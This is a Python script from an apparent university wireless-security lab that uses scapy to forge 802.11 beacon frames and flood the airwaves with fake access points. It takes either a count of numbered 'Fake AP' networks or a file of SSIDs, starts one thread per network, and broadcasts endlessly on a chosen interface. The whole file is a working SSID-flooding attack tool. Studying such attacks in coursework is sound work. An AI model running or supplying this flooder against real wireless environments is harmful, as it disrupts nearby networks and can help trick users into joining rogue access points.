# SWI - Labo1-MAC1
# Date: 28.02.2020
# File: SSIDfloodAttack.py
# Students: Stefan Dejanovic, Nathanael Mizutani

# source : https://www.thepythoncode.com/article/create-fake-access-points-scapy
# -*- coding: utf-8 -*-

from scapy.all import *
import threading 

def fakeAP(ssid):
    # generate a random MAC address (built-in in scapy)
    sender_mac = RandMAC()
    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
    # beacon layer
    beacon = Dot11Beacon()
    # putting ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    # stack all the layers and add a RadioTap
    frame = RadioTap()/dot11/beacon/essid
    # send the frame in layer 2 every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, iface=sys.argv[2], loop=1)

# If we don't have 2 arguments
if len(sys.argv) != 3:
    print("Please add arguments to use the script")
    print("1 argument: the number of AP or the file name")
    print("2 argument: Interface")
    exit()

# if the first argument is numeric
if sys.argv[1].isnumeric():
    # create a number of AP that is in parameter with the name Fake AP
    for x in range(0, int(sys.argv[1])):
        threadAP = threading.Thread(target=fakeAP, args=("Fake AP " + str(x),))
        threadAP.start()
else:
    try:
        # open the file
        f = open(sys.argv[1], "r")
        line = f.readline()
        # read all lines and create a AP peer line
        while line:
            threadAP = threading.Thread(target=fakeAP, args=(line,))
            threadAP.start()
            line = f.readline()
    except:
        print("The file doesn't exist")
    

